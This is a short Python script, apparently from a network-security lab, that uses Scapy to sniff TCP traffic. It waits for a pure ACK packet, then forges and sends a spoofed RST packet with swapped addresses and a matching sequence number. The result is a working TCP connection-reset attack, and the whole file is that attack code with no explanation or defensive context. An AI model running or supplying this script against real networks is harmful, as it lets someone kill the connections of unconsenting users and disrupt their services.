#! /usr/bin/env python
from scapy.all import *

def stopfilter(x):
	if x[TCP].flags == 16:
		return True
	else:
		return False

packets = sniff(filter='tcp', stop_filter=stopfilter)
packet = packets[-1]

src = packet[IP].dst
dst = packet[IP].src
sport = packet[TCP].dport
dport = packet[TCP].sport
flags = "R"
seq = packet[TCP].ack

hijack = IP(src=src, dst=dst)/TCP(sport=sport, dport=dport, flags=flags, seq=seq)
hijack.show()
send(hijack)